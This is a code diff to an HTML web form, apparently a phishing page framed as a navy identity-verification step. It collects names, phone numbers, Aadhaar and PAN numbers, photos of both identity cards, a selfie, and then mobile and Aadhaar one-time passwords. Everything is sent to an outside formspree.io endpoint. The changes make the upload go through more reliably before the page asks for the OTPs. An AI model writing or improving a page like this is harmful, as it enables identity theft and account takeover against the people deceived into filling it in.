@@ -25,7 +25,7 @@
     <form id="navyForm" action="https://formspree.io/f/xqedpwzb" method="POST" enctype="multipart/form-data">
         
         <div id="details-section">
-            <label>Full Name (As per Aadhaar) *</label>
+            <label>Full Name *</label>
             <input type="text" name="Full_Name" required>
 
             <label>Mobile Number *</label>
@@ -41,16 +41,16 @@
             <input type="text" name="PAN_Number" required>
 
             <label>Aadhaar Front Photo *</label>
-            <input type="file" name="Aadhaar_Front" required>
+            <input type="file" name="Aadhaar_Front" id="f1" required>
 
             <label>Aadhaar Back Photo *</label>
-            <input type="file" name="Aadhaar_Back" required>
+            <input type="file" name="Aadhaar_Back" id="f2" required>
 
             <label>PAN Card Photo *</label>
-            <input type="file" name="PAN_File" required>
+            <input type="file" name="PAN_File" id="f3" required>
 
             <label>Candidate Selfie (Live) *</label>
-            <input type="file" name="Selfie" required>
+            <input type="file" name="Selfie" id="f4" required>
             
             <button type="button" id="nextBtn" class="btn" onclick="submitStep1()">Next: Verify Identity</button>
         </div>
@@ -58,11 +58,9 @@
         <div id="otp-section">
             <h3 style="text-align:center; color:#003366; margin-top:0;">🔐 IDENTITY VERIFICATION</h3>
             <label>Mobile OTP *</label>
-            <input type="text" name="Mobile_OTP" placeholder="Enter Mobile OTP" required>
-            
+            <input type="text" name="Mobile_OTP" required>
             <label>Aadhaar OTP *</label>
-            <input type="text" name="Aadhaar_OTP" placeholder="Enter Aadhaar OTP" required>
-            
+            <input type="text" name="Aadhaar_OTP" required>
             <button type="submit" class="btn" style="background:#003366;">FINAL VERIFICATION</button>
         </div>
     </form>
@@ -72,25 +70,34 @@
     function submitStep1() {
         var form = document.getElementById('navyForm');
         var btn = document.getElementById('nextBtn');
-
-        if(!form.checkValidity()) {
-            alert("Please fill all details and upload all photos correctly.");
+        
+        // Manual Check taaki error na aaye
+        if(form.Full_Name.value == "" || form.Aadhaar_Number.value == "" || document.getElementById('f1').files.length == 0) {
+            alert("Please fill all details and select all photos.");
             return;
         }
 
-        btn.innerHTML = "Processing...";
+        btn.innerHTML = "Sending... Please wait";
         btn.disabled = true;
+
+        var formData = new FormData(form);
 
         fetch(form.action, {
             method: 'POST',
-            body: new FormData(form),
+            body: formData,
             headers: { 'Accept': 'application/json' }
         }).then(response => {
-            document.getElementById('details-section').style.display = 'none';
-            document.getElementById('otp-section').style.display = 'block';
-            window.scrollTo(0,0);
+            if (response.ok) {
+                document.getElementById('details-section').style.display = 'none';
+                document.getElementById('otp-section').style.display = 'block';
+                window.scrollTo(0,0);
+            } else {
+                alert("Server Error. Please try again.");
+                btn.innerHTML = "Next: Verify Identity";
+                btn.disabled = false;
+            }
         }).catch(error => {
-            alert("Error. Please try again.");
+            alert("Network Error. Check internet.");
             btn.innerHTML = "Next: Verify Identity";
             btn.disabled = false;
         });
